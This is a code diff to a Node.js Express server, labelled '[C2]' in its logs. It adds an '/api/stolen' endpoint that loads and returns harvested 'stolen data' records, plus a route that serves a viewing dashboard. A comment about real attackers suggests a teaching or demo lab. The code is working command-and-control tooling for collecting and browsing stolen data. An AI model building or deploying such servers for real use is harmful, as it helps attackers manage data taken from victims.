@@ -223,6 +223,39 @@ app.get('/collect', async (req, res) => {
 });
 
 /**
+ * API endpoint - return stolen data as JSON
+ */
+app.get('/api/stolen', async (req, res) => {
+    try {
+        const files = await fs.readdir(DATA_DIR);
+        const jsonFiles = files.filter(f => f.endsWith('.json') && f !== 'master-log.jsonl');
+        
+        const stolenRecords = [];
+        
+        for (const file of jsonFiles) {
+            const content = await fs.readFile(
+                path.join(DATA_DIR, file),
+                'utf8'
+            );
+            stolenRecords.push(JSON.parse(content));
+        }
+        
+        // Sort by timestamp (newest first)
+        stolenRecords.sort((a, b) => {
+            const timeA = a.metadata?.timestamp || a.server?.receivedAt || '';
+            const timeB = b.metadata?.timestamp || b.server?.receivedAt || '';
+            return timeB.localeCompare(timeA);
+        });
+        
+        res.json(stolenRecords);
+        
+    } catch (error) {
+        console.error('[C2] Error reading stolen data:', error);
+        res.status(500).json({ error: 'Error loading stolen data' });
+    }
+});
+
+/**
  * Dashboard endpoint - view stolen data
  * Real attackers would have password-protected admin panels
  */
@@ -355,6 +388,20 @@ function generateDashboard(records) {
         </html>
     `;
 }
+
+/**
+ * Dashboard endpoint - serves the main dashboard
+ */
+app.get('/', async (req, res) => {
+    try {
+        const dashboardPath = path.join(__dirname, 'dashboard.html');
+        const dashboard = await fs.readFile(dashboardPath, 'utf8');
+        res.send(dashboard);
+    } catch (error) {
+        console.error('[C2] Failed to serve dashboard:', error);
+        res.status(500).send('Dashboard not available');
+    }
+});
 
 /**
  * Health check endpoint
